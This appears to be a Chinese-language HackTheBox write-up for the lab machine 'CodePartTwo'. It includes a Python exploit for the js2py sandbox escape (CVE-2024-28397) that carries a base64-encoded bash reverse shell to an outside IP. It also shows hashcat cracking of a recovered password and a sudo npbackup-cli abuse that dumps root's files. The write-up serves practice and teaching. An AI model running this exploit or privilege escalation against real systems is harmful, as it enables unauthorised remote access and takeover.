{
  "id": 1765295686827.6487,
  "title": "HackTheBox CodePartTwo",
  "slug": "htb-codeparttwo",
  "date": "2025-09-08",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757339182223-c56ef7f2-7725-4c5a-ba81-2ebf35f19eb9.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn 10.10.11.82 -oN codeparttwo.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757339212648-66097d43-3288-4aad-973a-42c8c8d38380.png\" alt=\"\"></p>\n<h1>user</h1>\n<p>进入 8000，可以看到有三个功能点，登录注册和下载</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757391460201-b225de7a-2d6d-4d8d-b62c-17cfc34bf1da.png\" alt=\"\"></p>\n<p>可以看到下载之后为源码</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757391422950-af00d703-7d85-45e4-876c-60020972c0bd.png\" alt=\"\"></p>\n<p>S3cr3tK3yC0d3PartTw0</p>\n<p>runcode 这个方法会将代码传输给 js2py.eval_js 进行执行</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757391845832-0ebcd5fb-ffd4-4b5d-b3d8-41deda35ee06.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757391705477-bbabfe95-971f-43a6-a8ef-bf7b71f8815c.png\" alt=\"\"></p>\n<h2>cve-2024-28397</h2>\n<p>对于 js2py，有这个漏洞。js2py 的默认环境像一个沙箱，它限制了 JavaScript 代码访问 Node.js 的核心功能  </p>\n<p><a href=\"https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape\">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape</a></p>\n<p>但是这个只是本地环境验证的 poc，需要修改一下</p>\n<pre><code class=\"language-bash\">import requests\nimport json\n\nurl = &#39;http://codepartwo.htb:8000/run_code&#39;\n\njs_code = &quot;&quot;&quot;\n// [+] command goes here:\nlet cmd = &quot;echo KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDUvNTU2NiAwPiYxKSAm|base64 -d|bash&quot;;\n\nlet hacked, bymarve, n11;\nlet getattr, obj;\n\nhacked = Object.getOwnPropertyNames({});\n\n\nbymarve = hacked.__getattribute__;\nn11 = bymarve(&quot;__getattribute__&quot;);\nobj = n11(&quot;__class__&quot;).__base__;\ngetattr = obj.__getattribute__;\n\nfunction findpopen(o) {\n    let result;\n    for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i];\n        if(item.__module__ == &quot;subprocess&quot; &amp;&amp; item.__name__ == &quot;Popen&quot;) {\n            return item;\n        }\n        if(item.__name__ != &quot;type&quot; &amp;&amp; (result = findpopen(item))) {\n            return result;\n        }\n    }\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();\nconsole.log(n11);\nn11;\n&quot;&quot;&quot;\n\npayload = {&quot;code&quot;: js_code}\n\nheaders = {&quot;Content-Type&quot;: &quot;application/json&quot;}\n\n# 向远程服务器发送POST请求，执行恶意代码\nexp = requests.post(url, data=json.dumps(payload), headers=headers)\nprint(exp.text)\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757393350613-bc81eb91-4d0f-40f8-be86-96361883bc2b.png\" alt=\"\"></p>\n<p>我们下载的文件中有个 users.db，但是表里的 user 没有东西</p>\n<h2>users.db</h2>\n<p>我们可以看看这个有没有</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757395293811-cc2f9d61-d484-4efd-a56f-8d91983f1ad4.png\" alt=\"\"></p>\n<p>下面是 shell 中拿到的新的 users.db</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757395578412-81f5e54b-c4e7-4ac9-a235-51b012f236b4.png\" alt=\"\"></p>\n<p>marco 用户是有的，刚刚 shell 中看到</p>\n<p>hashcat 爆破一下</p>\n<pre><code class=\"language-bash\">hashcat hash.txt /usr/share/wordlists/rockyou.txt --show\n</code></pre>\n<p>sweetangelbabylove</p>\n<p>ssh 连接，就可以连接拿到 user.txt 了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757395822029-23978867-a97e-411f-8e27-80b082477fdc.png\" alt=\"\"></p>\n<h1>root</h1>\n<h2>npbackup</h2>\n<p>sudo -l 可以看到可以执行 npbackup-cli</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757395862116-1f224315-2e1c-4ee1-a4e0-169b6410f5ae.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">sudo /usr/local/bin/npbackup-cli --dump /root/root.txt --snapshot-id latest\n</code></pre>\n<p>会提示需要配置文件，当前目录下面就有一个配置文件。</p>\n<p>将配置目录改成/root</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757396506566-56e4fa18-5637-48f1-a9d0-d0aa5cd0f68f.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757396563722-6f9f2f85-a0bf-46b6-bca1-00f4f619f90b.png\" alt=\"\"></p>\n<p>先备份</p>\n<pre><code class=\"language-bash\">sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b -f\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757396637794-bb6f824b-68d4-4bd7-96ba-6c9875e2705b.png\" alt=\"\"></p>\n<p>再查看</p>\n<pre><code class=\"language-bash\">sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --dump /root/root.txt --snapshot-id latest\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757396719950-93cd4654-88ce-4681-9f0d-9ec92e03bb87.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757396740534-0f8c66f0-e88a-44f0-95e0-379ab2a7d091.png\" alt=\"\"></p>\n"
}